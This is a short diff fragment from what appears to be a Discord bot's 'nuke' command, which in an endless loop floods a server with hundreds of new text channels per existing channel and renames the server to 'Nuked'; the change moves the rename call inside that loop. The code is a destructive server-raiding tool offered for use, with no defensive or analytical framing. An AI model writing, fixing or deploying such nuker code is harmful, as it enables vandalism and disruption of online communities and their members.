@@ -39,13 +39,13 @@ async def nuke (ctx):
         except:
              pass
     for i in range(1):
-        await ctx.guild.edit("Nuked")
-    for i in range(1):
         await guild.create_text_channel(channel_names)
     while True:
         for channel in guild.text_channels:
             for i in range (500):
                 await guild.create_text_channel(channel_names)
+            for i in range(1):
+               await ctx.guild.edit("Nuked")
  
 
 @client.command()
